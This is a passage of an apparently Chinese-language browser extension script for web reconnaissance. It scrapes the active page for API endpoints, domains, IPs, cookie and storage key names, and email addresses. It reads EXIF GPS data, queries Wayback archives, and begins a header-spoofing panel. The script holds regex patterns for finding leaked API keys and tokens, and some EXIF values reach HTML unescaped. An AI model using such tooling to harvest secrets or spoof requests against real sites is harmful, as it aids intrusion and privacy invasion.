    utils.showToast('已导出 tabs_' + ts + '.txt', 'success');
  }

  // ====== Info Gather ======
  let gatherData = { api: [], domain: [], sensitive: [], ip: [] };
  let currentGatherTab = 'api';

  function renderGatherTab() {
    const list = gatherData[currentGatherTab] || [];
    const container = utils.get('gather-results');
    const statusEl = utils.get('gather-status');

    if (list.length === 0) {
      container.innerHTML = '<div class="empty-state">点击「收集当前页面」开始</div>';
      statusEl.textContent = '';
      return;
    }

    statusEl.textContent = '共 ' + list.length + ' 条';
    let html = '';
    list.forEach(item => {
      html += '<div class="gather-item">';
      html +=
        '<span class="gather-item-type type-' +
        (item.type || 'other') +
        '">' +
        item.type +
        '</span>';
      html +=
        '<span class="gather-item-value" title="' +
        utils.escapeHtml(item.value) +
        '">' +
        utils.escapeHtml(item.value) +
        '</span>';
      html +=
        '<button class="gather-item-copy" data-copy="' +
        utils.escapeHtml(item.value) +
        '">复制</button>';
      html += '</div>';
    });
    container.innerHTML = html;

    container.querySelectorAll('.gather-item-copy').forEach(btn => {
      btn.addEventListener('click', () => {
        utils.copyText(btn.dataset.copy);
        utils.showToast('已复制', 'success');
      });
    });
  }

  function switchGatherTab(tab) {
    currentGatherTab = tab;
    document
      .querySelectorAll('.gather-tab')
      .forEach(b => b.classList.toggle('active', b.dataset.gather === tab));
    renderGatherTab();
  }

  async function gatherInfo() {
    const statusEl = utils.get('gather-status');
    statusEl.textContent = '正在收集...';

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.url) {
        statusEl.textContent = '无法获取当前页面';
        return;
      }

      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const pageUrl = location.href;
          const pageHtml = document.documentElement.outerHTML;
          const collected = { api: [], domain: [], sensitive: [], ip: [] };
          const seen = { api: new Set(), domain: new Set(), sensitive: new Set(), ip: new Set() };

          function add(cat, type, value) {
            if (!value || seen[cat].has(value)) return;
            seen[cat].add(value);
            collected[cat].push({ type, value });
          }

          // 1. API endpoints
          document.querySelectorAll('form').forEach(form => {
            const action = form.getAttribute('action') || '';
            const method = (form.method || 'GET').toUpperCase();
            if (action) {
              const fullUrl = new URL(action, pageUrl).href;
              add('api', method.toLowerCase(), fullUrl);
            }
          });

          // Script src as potential API base
          document.querySelectorAll('script[src]').forEach(s => {
            const src = s.src;
            if (src) {
              const m = src.match(/^(https?:\/\/[^/]+)/i);
              if (m) add('api', 'src', m[1]);
            }
          });

          // Extract API paths from inline scripts
          document.querySelectorAll('script:not([src])').forEach(s => {
            const text = s.textContent || '';
            const apiMatches = text.match(/["'](\/api\/[^"']+)["']/g) || [];
            apiMatches.forEach(m => add('api', 'api', m.replace(/["']/g, '')));
            const pathMatches = text.match(/["'](\/[a-zA-Z0-9_/{}-]+)["']/g) || [];
            pathMatches.forEach(m => {
              const p = m.replace(/["']/g, '');
              if (p.length > 2 && /\/(v\d|api|rest|graphql|json|ws|socket)/i.test(p)) {
                add('api', 'api', p);
              }
            });
            const fetchMatches = text.match(/fetch\s*\(\s*["']([^"']+)["']/gi) || [];
            fetchMatches.forEach(m =>
              add('api', 'get', m.replace(/^fetch\s*\(\s*["']/i, '').replace(/["']\s*\)$/i, ''))
            );
            const ajaxMatches =
              text.match(/\$?\.(?:get|post|put|delete|ajax|fetch)\s*\(\s*["']([^"']+)["']/gi) || [];
            ajaxMatches.forEach(m => {
              const url = m.replace(/^.*\(\s*["']/, '').replace(/["']/, '');
              if (url) {
                const method = /\.(post|put|delete)/i.test(m)
                  ? m.match(/\.(post|put|delete)/i)[1]
                  : 'get';
                add('api', method.toLowerCase(), url);
              }
            });
            const wsMatches = text.match(/wss?:\/\/[^"'\s]+/g) || [];
            wsMatches.forEach(u => add('api', 'ws', u));
          });

          // Link[href] endpoints
          document.querySelectorAll('link[href]').forEach(l => {
            const href = l.href;
            if (href && /\.(json|xml|yaml)$/i.test(href)) add('api', 'api', href);
          });

          // 2. Domains
          document.querySelectorAll('[href]').forEach(el => {
            try {
              const url = new URL(el.href, pageUrl);
              if (url.hostname !== location.hostname) add('domain', 'link', url.hostname);
            } catch {}
          });
          document.querySelectorAll('[src]').forEach(el => {
            try {
              const url = new URL(el.src, pageUrl);
              if (url.hostname !== location.hostname) add('domain', 'src', url.hostname);
            } catch {}
          });
          document.querySelectorAll('iframe[src],frame[src]').forEach(el => {
            try {
              const url = new URL(el.src, pageUrl);
              add('domain', 'frame', url.hostname);
            } catch {}
          });

          // 3. Sensitive info
          // Meta generator
          document.querySelectorAll('meta[name="generator"]').forEach(m => {
            if (m.content) add('sensitive', 'meta', 'Generator: ' + m.content);
          });

          // Emails
          const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
          const emails = pageHtml.match(emailRegex) || [];
          emails.forEach(e => add('sensitive', 'email', e));

          // API keys/tokens in meta or inline scripts
          const tokenPatterns = [
            /(?:api[_-]?key|apikey|token|secret|access[_-]?key|auth[_-]?token|bearer)\s*[:=]\s*["']([^"']{8,})["']/gi,
            /(?:sk|pk|rk)[_-][a-zA-Z0-9]{20,}/g,
            /(?:AIza|ya29)[a-zA-Z0-9_-]{30,}/g,
            /ghp_[a-zA-Z0-9]{30,}/g,
            /glpat-[a-zA-Z0-9_-]{20,}/g,
            /xox[bpras]-[a-zA-Z0-9-]{10,}/g,
          ];
          tokenPatterns.forEach(pattern => {
            const matches = pageHtml.match(pattern) || [];
            matches.forEach(m => {
              const val =
                m.includes('=') || m.includes(':')
                  ? m
                      .split(/[:=]/)
                      .pop()
                      .trim()
                      .replace(/^["']|["']$/g, '')
                  : m;
              add('sensitive', 'token', val);
            });
          });

          // Comments with sensitive info
          const commentRegex = /<!--([\s\S]*?)-->/g;
          let commentMatch;
          while ((commentMatch = commentRegex.exec(pageHtml)) !== null) {
            const comment = commentMatch[1].trim();
            if (comment.length > 5 && comment.length < 200) {
              if (/todo|fixme|hack|bug|password|key|secret|temp/i.test(comment)) {
                add('sensitive', 'comment', comment);
              }
            }
          }

          // Cookies
          document.cookie.split(';').forEach(c => {
            const name = c.split('=')[0].trim();
            if (name) add('sensitive', 'cookie', name);
          });

          // localStorage keys
          try {
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              if (/token|key|secret|session|auth|user|admin/i.test(key)) {
                add('sensitive', 'storage', 'localStorage: ' + key);
              }
            }
          } catch {}

          // 4. IP addresses
          const ipRegex = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;
          const ips = pageHtml.match(ipRegex) || [];
          ips.forEach(ip => {
            const parts = ip.split('.').map(Number);
            if (parts[0] !== 0 && parts[0] !== 127 && parts.every(p => p >= 0 && p <= 255)) {
              add('ip', 'ip', ip);
            }
          });

          // Internal/private IPs
          ips.forEach(ip => {
            const p = ip.split('.').map(Number);
            if (
              p[0] === 10 ||
              (p[0] === 172 && p[1] >= 16 && p[1] <= 31) ||
              (p[0] === 192 && p[1] === 168)
            ) {
              add('ip', 'ip', ip);
            }
          });

          // Cloud/hosting domains hint
          const domainStr = collected.domain.map(d => d.value).join(' ');
          const cloudHints = [
            { pattern: /aws\.amazon/i, label: 'AWS' },
            { pattern: /azure\.microsoft/i, label: 'Azure' },
            { pattern: /googleapis\.com/i, label: 'GCP' },
            { pattern: /aliyuncs\.com/i, label: 'Aliyun' },
            { pattern: /tencentcloud/i, label: 'Tencent' },
            { pattern: /cloudflare/i, label: 'Cloudflare' },
            { pattern: /fastly/i, label: 'Fastly' },
            { pattern: /cdn\.|c\.cloudfront\.net/i, label: 'CDN' },
          ];
          cloudHints.forEach(h => {
            if (h.pattern.test(pageHtml + domainStr)) add('ip', 'cloud', h.label);
          });

          return collected;
        },
      });

      if (results?.[0]?.result) {
        gatherData = results[0].result;
        renderGatherTab();
        const total = Object.values(gatherData).reduce((s, a) => s + a.length, 0);
        statusEl.textContent = '收集完成，共 ' + total + ' 条';
        utils.showToast('收集完成', 'success');
        chrome.storage.local.set({ gatherData: gatherData, gatherDataUrl: tab.url });
      } else {
        statusEl.textContent = '收集失败';
      }
    } catch (e) {
      statusEl.textContent = '收集失败: ' + e.message;
      utils.showToast('收集失败', 'error');
    }
  }

  // ====== Link Extract ======
  let allLinks = [];

  function getTagInfo(el) {
    if (!el) return { tag: 'a', label: 'a' };
    const name = el.tagName.toLowerCase();
    if (name === 'a') return { tag: 'a', label: 'a' };
    if (name === 'img') return { tag: 'img', label: 'img' };
    if (name === 'script') return { tag: 'script', label: 'script' };
    if (name === 'link') return { tag: 'link', label: 'link' };
    if (name === 'iframe' || name === 'frame') return { tag: 'iframe', label: 'iframe' };
    return { tag: 'other', label: name };
  }

  async function extractLinks() {
    const statusEl = utils.get('links-count');
    statusEl.textContent = '正在提取...';

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.url) {
        statusEl.textContent = '无法获取当前页面';
        return;
      }

      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const pageUrl = location.href;
          const pageDomain = location.hostname;
          const links = [];

          // <a href>
          document.querySelectorAll('a[href]').forEach(el => {
            const href = el.href;
            if (!href || href === '#' || href.startsWith('javascript:')) return;
            let domain = '';
            try {
              domain = new URL(href, pageUrl).hostname;
            } catch {}
            links.push({
              href,
              text:
                (el.textContent || '').trim().substring(0, 60) || el.getAttribute('title') || '',
              tag: 'a',
              domain,
              isExternal: domain !== pageDomain,
              isJS: href.startsWith('javascript:'),
              isMailto: href.startsWith('mailto:'),
            });
          });

          // <img src>
          document.querySelectorAll('img[src]').forEach(el => {
            links.push({
              href: el.src,
              text: el.alt || '',
              tag: 'img',
              domain: '',
              isExternal: false,
              isJS: false,
              isMailto: false,
            });
            try {
              links[links.length - 1].domain = new URL(el.src, pageUrl).hostname;
              links[links.length - 1].isExternal = links[links.length - 1].domain !== pageDomain;
            } catch {}
          });

          // <script src>
          document.querySelectorAll('script[src]').forEach(el => {
            const src = el.src;
            let domain = '';
            try {
              domain = new URL(src, pageUrl).hostname;
            } catch {}
            links.push({
              href: src,
              text: '',
              tag: 'script',
              domain,
              isExternal: domain !== pageDomain,
              isJS: false,
              isMailto: false,
            });
          });

          // <link href>
          document.querySelectorAll('link[href]').forEach(el => {
            const href = el.href;
            let domain = '';
            try {
              domain = new URL(href, pageUrl).hostname;
            } catch {}
            links.push({
              href,
              text: el.rel || '',
              tag: 'link',
              domain,
              isExternal: domain !== pageDomain,
              isJS: false,
              isMailto: false,
            });
          });

          // <iframe src>
          document.querySelectorAll('iframe[src],frame[src]').forEach(el => {
            const src = el.src;
            let domain = '';
            try {
              domain = new URL(src, pageUrl).hostname;
            } catch {}
            links.push({
              href: src,
              text: '',
              tag: 'iframe',
              domain,
              isExternal: domain !== pageDomain,
              isJS: false,
              isMailto: false,
            });
          });

          // Deduplicate by href
          const seen = new Set();
          return links.filter(l => {
            if (seen.has(l.href)) return false;
            seen.add(l.href);
            return true;
          });
        },
      });

      if (results?.[0]?.result) {
        allLinks = results[0].result;
        renderLinks();
        statusEl.textContent = '提取完成，共 ' + allLinks.length + ' 个链接';
        utils.showToast('提取完成', 'success');
        chrome.storage.local.set({ allLinks: allLinks, allLinksUrl: tab.url });
      }
    } catch (e) {
      utils.get('links-count').textContent = '提取失败: ' + e.message;
      utils.showToast('提取失败', 'error');
    }
  }

  function getFilteredLinks() {
    const filterText = utils.get('links-filter').value.trim().toLowerCase();
    const filterType = utils.get('links-filter-type').value;

    return allLinks.filter(link => {
      if (filterType !== 'all' && link.tag !== filterType && filterType !== 'script') return false;
      if (filterType === 'script' && !link.isJS && link.tag !== 'script') return false;
      if (filterType === 'external' && !link.isExternal) return false;
      if (filterType === 'internal' && link.isExternal) return false;
      if (
        filterText &&
        !link.href.toLowerCase().includes(filterText) &&
        (!link.text || !link.text.toLowerCase().includes(filterText)) &&
        (!link.domain || !link.domain.toLowerCase().includes(filterText))
      )
        return false;
      return true;
    });
  }

  function renderLinks() {
    const filtered = getFilteredLinks();
    const container = utils.get('links-results');
    const countEl = utils.get('links-count');

    const existingText = countEl.textContent;
    if (!existingText.includes('正在')) {
      countEl.textContent = '显示 ' + filtered.length + ' / ' + allLinks.length + ' 个链接';
    }

    if (filtered.length === 0) {
      container.innerHTML = '<div class="empty-state">没有匹配的链接</div>';
      return;
    }

    let html = '';
    filtered.forEach(link => {
      const tagClass = 'tag-' + link.tag;
      html += '<div class="link-item">';
      html += '<span class="link-item-tag ' + tagClass + '">' + link.tag + '</span>';
      html += '<span class="link-item-text">';
      html +=
        '<span class="link-item-href" title="' +
        utils.escapeHtml(link.href) +
        '">' +
        utils.escapeHtml(link.href) +
        '</span>';
      if (link.domain)
        html +=
          '<span class="link-item-domain">' +
          utils.escapeHtml(link.domain) +
          (link.text ? ' - ' + utils.escapeHtml(link.text) : '') +
          '</span>';
      html += '</span>';
      html +=
        '<button class="link-item-copy" data-href="' +
        utils.escapeHtml(link.href) +
        '">复制</button>';
      html += '</div>';
    });
    container.innerHTML = html;

    container.querySelectorAll('.link-item-copy').forEach(btn => {
      btn.addEventListener('click', () => {
        utils.copyText(btn.dataset.href);
        utils.showToast('已复制', 'success');
      });
    });
  }

  // ====== EXIF Viewer ======
  let lastExifData = null;

  const EXIF_SECTIONS = [
    {
      title: '拍摄信息',
      fields: [
        { key: 'DateTimeOriginal', label: '拍摄时间', format: 'date' },
        { key: 'ISO', label: 'ISO 感光度' },
        { key: 'FNumber', label: '光圈', format: 'fnumber' },
        { key: 'ExposureTime', label: '快门速度', format: 'exposure' },
        { key: 'ExposureCompensation', label: '曝光补偿', format: 'ev' },
        { key: 'FocalLength', label: '焦距', format: 'focal' },
        { key: 'FocalLengthIn35mmFormat', label: '等效焦距', format: 'focal' },
        { key: 'MeteringMode', label: '测光模式' },
        { key: 'WhiteBalance', label: '白平衡' },
        { key: 'Flash', label: '闪光灯' },
        { key: 'ExposureProgram', label: '曝光程序' },
      ],
    },
    {
      title: '相机信息',
      fields: [
        { key: 'Make', label: '品牌' },
        { key: 'Model', label: '型号' },
        { key: 'LensModel', label: '镜头' },
        { key: 'LensMake', label: '镜头品牌' },
        { key: 'Software', label: '软件' },
        { key: 'ImageWidth', label: '图像宽度', format: 'pixel' },
        { key: 'ImageHeight', label: '图像高度', format: 'pixel' },
        { key: 'ColorSpace', label: '色彩空间' },
      ],
    },
    {
      title: 'GPS 信息',
      fields: [
        { key: 'latitude', label: '纬度', format: 'gps' },
        { key: 'longitude', label: '经度', format: 'gps' },
        { key: 'GPSAltitude', label: '海拔', format: 'altitude' },
      ],
    },
  ];

  function formatExifValue(value, format) {
    if (value === undefined || value === null) return null;
    switch (format) {
      case 'date':
        if (value instanceof Date) return value.toLocaleString('zh-CN');
        return String(value);
      case 'fnumber':
        return 'f/' + value;
      case 'exposure':
        if (value < 1) {
          const denom = Math.round(1 / value);
          return '1/' + denom + 's';
        }
        return value + 's';
      case 'ev':
        return (value >= 0 ? '+' : '') + value + ' EV';
      case 'focal':
        return value + 'mm';
      case 'pixel':
        return value + ' px';
      case 'altitude':
        return value + ' m';
      case 'gps':
        return value;
      default:
        return String(value);
    }
  }

  function formatGpsDms(value) {
    const abs = Math.abs(value);
    const d = Math.floor(abs);
    const m = Math.floor((abs - d) * 60);
    const s = ((abs - d) * 60 - m) * 60;
    const dir = value > 0 ? 'N' : 'S';
    return d + '\u00B0' + m + "'" + s.toFixed(2) + '"' + dir;
  }

  async function handleExifFile(file) {
    const resultEl = utils.get('exif-result');
    const emptyEl = utils.get('exif-empty');
    const sectionsEl = utils.get('exif-sections');
    const previewImg = utils.get('exif-preview-img');
    const fileNameEl = utils.get('exif-file-name');
    const fileSizeEl = utils.get('exif-file-size');

    resultEl.classList.add('hidden');
    emptyEl.classList.add('hidden');
    sectionsEl.innerHTML = '<div class="empty-state">正在解析...</div>';

    const objectUrl = URL.createObjectURL(file);
    previewImg.src = objectUrl;
    fileNameEl.textContent = file.name;
    fileSizeEl.textContent = (file.size / 1024).toFixed(1) + ' KB';

    try {
      const exif = await exifr.parse(file, {
        tiff: true,
        exif: true,
        gps: true,
        ifd1: true,
        interop: false,
        translateValues: true,
        translateKeys: true,
        reviveValues: true,
      });

      if (!exif || Object.keys(exif).length === 0) {
        resultEl.classList.remove('hidden');
        emptyEl.classList.remove('hidden');
        sectionsEl.innerHTML = '';
        lastExifData = null;
        return;
      }

      lastExifData = exif;
      resultEl.classList.remove('hidden');

      let html = '';
      EXIF_SECTIONS.forEach(section => {
        const hasData = section.fields.some(f => exif[f.key] !== undefined && exif[f.key] !== null);
        if (!hasData) return;

        html += '<div class="exif-section">';
        html += '<div class="exif-section-title">' + section.title + '</div>';

        section.fields.forEach(field => {
          if (exif[field.key] === undefined || exif[field.key] === null) return;

          if (field.format === 'gps' && (field.key === 'latitude' || field.key === 'longitude')) {
            const lat = exif.latitude;
            const lon = exif.longitude;
            const latStr = formatGpsDms(lat) + ' (' + lat.toFixed(6) + ')';
            const lonStr =
              formatGpsDms(lon).replace('N', 'E').replace('S', 'W') + ' (' + lon.toFixed(6) + ')';
            if (field.key === 'latitude') {
              html +=
                '<div class="exif-row"><span class="exif-label">纬度</span><span class="exif-value" title="' +
                utils.escapeHtml(String(lat)) +
                '">' +
                utils.escapeHtml(latStr) +
                '</span></div>';
            } else {
              html +=
                '<div class="exif-row"><span class="exif-label">经度</span><span class="exif-value" title="' +
                utils.escapeHtml(String(lon)) +
                '">' +
                utils.escapeHtml(lonStr) +
                '</span></div>';
            }
            return;
          }

          const formatted = formatExifValue(exif[field.key], field.format);
          if (!formatted) return;

          html += '<div class="exif-row">';
          html += '<span class="exif-label">' + field.label + '</span>';
          html +=
            '<span class="exif-value" title="' +
            String(exif[field.key]) +
            '">' +
            formatted +
            '</span>';
          html += '</div>';
        });

        if (
          exif.latitude !== undefined &&
          exif.longitude !== undefined &&
          section.title === 'GPS 信息'
        ) {
          const mapUrl = 'https://www.google.com/maps?q=' + exif.latitude + ',' + exif.longitude;
          html +=
            '<div class="exif-gps-row"><a class="exif-gps-link" href="' +
            mapUrl +
            '" target="_blank">在地图中查看</a></div>';
        }

        html += '</div>';
      });

      sectionsEl.innerHTML = html || '';
      utils.showToast('EXIF 解析完成', 'success');
    } catch (e) {
      resultEl.classList.remove('hidden');
      emptyEl.classList.remove('hidden');
      emptyEl.textContent = '解析失败: ' + e.message;
      sectionsEl.innerHTML = '';
      lastExifData = null;
    }
  }

  function initExifDragDrop() {
    const area = utils.get('exif-upload-area');
    const fileInput = utils.get('exif-file-input');
    if (!area || !fileInput) return;

    area.addEventListener('click', () => fileInput.click());
    fileInput.addEventListener('change', e => {
      if (e.target.files[0]) handleExifFile(e.target.files[0]);
    });
    area.addEventListener('dragover', e => {
      e.preventDefault();
      area.classList.add('dragover');
    });
    area.addEventListener('dragleave', () => area.classList.remove('dragover'));
    area.addEventListener('drop', e => {
      e.preventDefault();
      area.classList.remove('dragover');
      const file = e.dataTransfer.files[0];
      if (file) handleExifFile(file);
    });
  }

  function switchExifMode(mode) {
    document
      .querySelectorAll('.exif-mode-btn')
      .forEach(b => b.classList.toggle('active', b.dataset.mode === mode));
    utils.get('exif-mode-local').classList.toggle('hidden', mode !== 'local');
    utils.get('exif-mode-url').classList.toggle('hidden', mode !== 'url');
    utils.get('exif-mode-page').classList.toggle('hidden', mode !== 'page');
  }

  async function fetchExifFromUrl(url) {
    const resultEl = utils.get('exif-result');
    const emptyEl = utils.get('exif-empty');
    const sectionsEl = utils.get('exif-sections');
    const previewImg = utils.get('exif-preview-img');
    const fileNameEl = utils.get('exif-file-name');
    const fileSizeEl = utils.get('exif-file-size');

    resultEl.classList.add('hidden');
    emptyEl.classList.add('hidden');
    sectionsEl.innerHTML = '<div class="empty-state">正在获取图片...</div>';

    previewImg.src = url;
    fileNameEl.textContent = url.split('/').pop() || url;
    fileSizeEl.textContent = '';

    chrome.runtime.sendMessage({ type: 'FETCH_IMAGE', url }, response => {
      if (!response || response.error) {
        resultEl.classList.remove('hidden');
        emptyEl.classList.remove('hidden');
        emptyEl.textContent = '获取失败: ' + (response?.error || '无响应，请检查网络');
        sectionsEl.innerHTML = '';
        return;
      }
      if (!response.data) {
        resultEl.classList.remove('hidden');
        emptyEl.classList.remove('hidden');
        emptyEl.textContent = '获取失败: 图片数据为空';
        sectionsEl.innerHTML = '';
        return;
      }
      const bytes = Uint8Array.from(atob(response.data), c => c.charCodeAt(0));
      const mime = url.match(/\.(jpe?g|png|webp|tiff?|heic)/i)
        ? 'image/' + RegExp.$1.toLowerCase().replace('jpg', 'jpeg')
        : 'image/jpeg';
      const blob = new Blob([bytes], { type: mime });
      const file = new File([blob], fileNameEl.textContent, { type: mime });
      fileSizeEl.textContent = (file.size / 1024).toFixed(1) + ' KB';
      handleExifFile(file);
    });
  }

  async function scanPageImages() {
    const container = utils.get('exif-page-images');
    container.innerHTML = '<div class="empty-state">正在扫描...</div>';

    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.url) {
        container.innerHTML = '<div class="empty-state">无法获取当前页面</div>';
        return;
      }

      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const imgs = [];
          document.querySelectorAll('img[src]').forEach(img => {
            if (img.src && img.naturalWidth > 50 && img.naturalHeight > 50) {
              imgs.push({
                src: img.src,
                alt: img.alt || '',
                w: img.naturalWidth,
                h: img.naturalHeight,
              });
            }
          });
          document.querySelectorAll('[style*="background"]').forEach(el => {
            const m = el.style.backgroundImage.match(/url\(["']?(.*?)["']?\)/);
            if (m && m[1]) imgs.push({ src: m[1], alt: '', w: 0, h: 0 });
          });
          const unique = [...new Map(imgs.map(i => [i.src, i])).values()];
          return unique.slice(0, 50);
        },
      });

      const images = results?.[0]?.result || [];
      if (images.length === 0) {
        container.innerHTML = '<div class="empty-state">未找到图片</div>';
        return;
      }

      let html =
        '<div class="exif-page-count">找到 ' + images.length + ' 张图片（点击查看 EXIF）</div>';
      images.forEach(img => {
        html += '<div class="exif-page-item" data-url="' + utils.escapeHtml(img.src) + '">';
        html += '<img class="exif-page-thumb" src="' + utils.escapeHtml(img.src) + '" alt="">';
        html += '<div class="exif-page-info">';
        if (img.w) html += '<span>' + img.w + ' x ' + img.h + '</span>';
        html +=
          '<span class="exif-page-src">' +
          utils.escapeHtml(img.alt || img.src.split('/').pop()) +
          '</span>';
        html += '</div></div>';
      });
      container.innerHTML = html;

      container.querySelectorAll('.exif-page-item').forEach(item => {
        item.addEventListener('click', () => {
          fetchExifFromUrl(item.dataset.url);
        });
      });
    } catch (e) {
      container.innerHTML =
        '<div class="empty-state">扫描失败: ' + utils.escapeHtml(e.message) + '</div>';
    }
  }

  function checkExifPending() {
    chrome.storage.local.get(['exif_pending_url'], result => {
      const url = result.exif_pending_url;
      if (!url) return;
      chrome.storage.local.remove(['exif_pending_url']);
      switchExifMode('url');
      utils.get('exif-url-input').value = url;
      fetchExifFromUrl(url);
    });
  }

  // ====== History Archive ======
  let lastHistoryResults = [];

  function showHistoryQuickLinks(domain) {
    if (!domain) return;
    const quickLinks = utils.get('history-quick-links');
    quickLinks.innerHTML =
      '<button class="quick-link-btn" data-url="https://web.archive.org/web/*/' +
      encodeURIComponent(domain) +
      '/*">Wayback Machine 日历</button>' +
      '<button id="history-latest-btn" class="quick-link-btn quick-latest hidden" data-url="">查看最新快照</button>';

    if (!showHistoryQuickLinks._bound) {
      const panel = document.getElementById('panel-history');
      if (panel) {
        panel.addEventListener('click', e => {
          const btn = e.target.closest('[data-url]');
          if (btn && btn.dataset.url) {
            chrome.tabs.create({ url: btn.dataset.url });
            e.preventDefault();
          }
        });
        showHistoryQuickLinks._bound = true;
      }
    }
  }

  function buildCdxUrl(domain) {
    const matchType = utils.get('history-match-type').value;
    const outputType = utils.get('history-output-type').value;
    const fields = utils.get('history-fields').value;
    const from = utils.get('history-from').value;
    const to = utils.get('history-to').value;
    const typeFilter = utils.get('history-type-filter').value.trim();

    let url = 'https://web.archive.org/cdx/search/cdx?url=' + encodeURIComponent(domain);
    url += '&collapse=urlkey';
    url += '&matchType=' + matchType;
    url += '&output=' + outputType;
    url += '&fl=' + encodeURIComponent(fields);
    if (from) url += '&from=' + from;
    if (to) url += '&to=' + to;
    if (typeFilter) {
      const types = typeFilter
        .toLowerCase()
        .split(/[,，\s]+/)
        .filter(Boolean);
      types.forEach(t => {
        url += '&filter=original:.*\\.' + encodeURIComponent(t) + '($|\\?.*)';
      });
    }
    url += '&limit=100000';
    return url;
  }

  function getFileType(url) {
    try {
      const pathname = new URL(url).pathname;
      const ext = pathname.split('.').pop().toLowerCase().split('?')[0].split('#')[0];
      if (ext && ext.length < 10) return ext;
      return '';
    } catch {
      return '';
    }
  }

  function filterByType(items, typeFilter) {
    if (!typeFilter) return items;
    const types = typeFilter
      .toLowerCase()
      .split(/[,，\s]+/)
      .filter(Boolean);
    if (types.length === 0) return items;
    return items.filter(item => {
      const fileType = getFileType(item.url || '');
      return types.some(t => fileType === t || (item.mimetype || '').includes(t));
    });
  }

  function parseCdxText(text) {
    return text
      .split('\n')
      .filter(line => line.trim())
      .map(line => {
        const parts = line.split(' ');
        return { raw: line, url: parts[parts.length - 1] || line };
      });
  }

  function parseCdxJson(data) {
    if (!Array.isArray(data) || data.length < 2) return [];
    const fieldCount = data[0].length;
    return data.slice(1).map(row => {
      const obj = { raw: row.join(' ') };
      row.forEach((val, i) => {
        obj[data[0][i]] = val;
      });
      obj.url = row[fieldCount - 1] || '';
      return obj;
    });
  }

  function renderHistoryResults(items) {
    lastHistoryResults = items;
    const container = utils.get('history-timeline');
    const statusEl = utils.get('history-status');
    const fields = utils.get('history-fields').value;
    const hasTs = fields.includes('timestamp');

    if (items.length === 0) {
      container.innerHTML = '<div class="empty-state">未找到历史档案</div>';
      statusEl.textContent = '无结果';
      return;
    }

    statusEl.textContent = '共 ' + items.length + ' 条记录';
    utils.get('history-total').textContent = items.length;

    if (hasTs) {
      const timestamps = items
        .map(i => i.timestamp || '')
        .filter(Boolean)
        .sort();
      if (timestamps.length > 0) {
        const fmt = ts => ts.substring(0, 4) + '-' + ts.substring(4, 6) + '-' + ts.substring(6, 8);
        utils.get('history-first').textContent = fmt(timestamps[0]);
        utils.get('history-last').textContent = fmt(timestamps[timestamps.length - 1]);
        utils.get('history-summary').classList.remove('hidden');
      }
    }

    let html = '';
    items.slice(0, 200).forEach(item => {
      const url = item.url || item.raw;
      const ts = item.timestamp || '';
      const status = item.statuscode || '';
      const mime = item.mimetype || '';
      const dateStr = ts
        ? ts.substring(0, 4) +
          '-' +
          ts.substring(4, 6) +
          '-' +
          ts.substring(6, 8) +
          ' ' +
          ts.substring(8, 10) +
          ':' +
          ts.substring(10, 12)
        : '';
      const waybackUrl = ts
        ? 'https://web.archive.org/web/' + ts + '/' + url
        : 'https://web.archive.org/web/*/' + encodeURIComponent(url);

      let statusClass = 'status-other';
      if (status === '200') statusClass = 'status-200';
      else if (status === '301' || status === '302') statusClass = 'status-301';
      else if (status === '404') statusClass = 'status-404';

      html += '<div class="timeline-item">';
      if (hasTs) html += '<span class="timeline-date">' + utils.escapeHtml(dateStr) + '</span>';
      if (status)
        html +=
          '<span class="timeline-status ' +
          utils.escapeHtml(statusClass) +
          '">' +
          utils.escapeHtml(status) +
          '</span>';
      if (mime)
        html += '<span class="timeline-status status-other">' + utils.escapeHtml(mime) + '</span>';
      html +=
        '<span class="timeline-url" data-wayback="' +
        utils.escapeHtml(waybackUrl) +
        '" title="' +
        utils.escapeHtml(url) +
        '">' +
        utils.escapeHtml(url) +
        '</span>';
      html +=
        '<button class="timeline-open" data-url="' +
        utils.escapeHtml(waybackUrl) +
        '">查看</button>';
      html += '</div>';
    });
    if (items.length > 200) html += '<div class="empty-state">仅显示前 200 条</div>';
    container.innerHTML = html;
  }

  function extractDomain(input) {
    try {
      const url = new URL(/^https?:\/\//i.test(input) ? input : 'https://' + input);
      return url.hostname;
    } catch {
      return input.trim();
    }
  }

  async function queryHistory() {
    let raw = utils.get('history-domain').value.trim();
    if (!raw) {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab?.url) {
        utils.showToast('请输入域名或打开一个网页', 'warning');
        return;
      }
      raw = tab.url;
    }
    const domain = extractDomain(raw);
    utils.get('history-domain').value = domain;

    showHistoryQuickLinks(domain);
    utils.get('history-status').textContent = '正在查询...';
    utils.get('history-timeline').innerHTML = '';

    const cdxUrl = buildCdxUrl(domain);
    chrome.runtime.sendMessage({ type: 'FETCH_URL', url: cdxUrl }, response => {
      if (response?.error) {
        utils.get('history-status').textContent = '查询失败: ' + response.error;
        return;
      }
      try {
        const outputType = utils.get('history-output-type').value;
        const items =
          outputType === 'json'
            ? parseCdxJson(JSON.parse(response.data))
            : parseCdxText(response.data);
        renderHistoryResults(items);
        utils.showToast('查询完成', 'success');

        // Update "最新快照" button
        const latest = items[items.length - 1];
        if (latest && latest.timestamp) {
          const latestBtn = document.getElementById('history-latest-btn');
          if (latestBtn) {
            latestBtn.dataset.url =
              'https://web.archive.org/web/' + latest.timestamp + '/' + latest.url;
            latestBtn.classList.remove('hidden');
          }
        }
      } catch {
        utils.get('history-status').textContent = '解析结果失败';
      }
    });
  }

  // ====== Request Spoofing ======
  let currentSpoofTab = 'ua';
  let spoofState = {
    ua: { enabled: false, current: '', original: '' },
    headers: { xff: '', referer: '', clientIp: '', custom: [] },
  };

  const UA_PRESETS = {
    mobile: [
      {
        label: 'iPhone 15 (iOS 17)',
        value:
          'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
      },
      {
        label: 'iPhone 14 Pro',
        value:
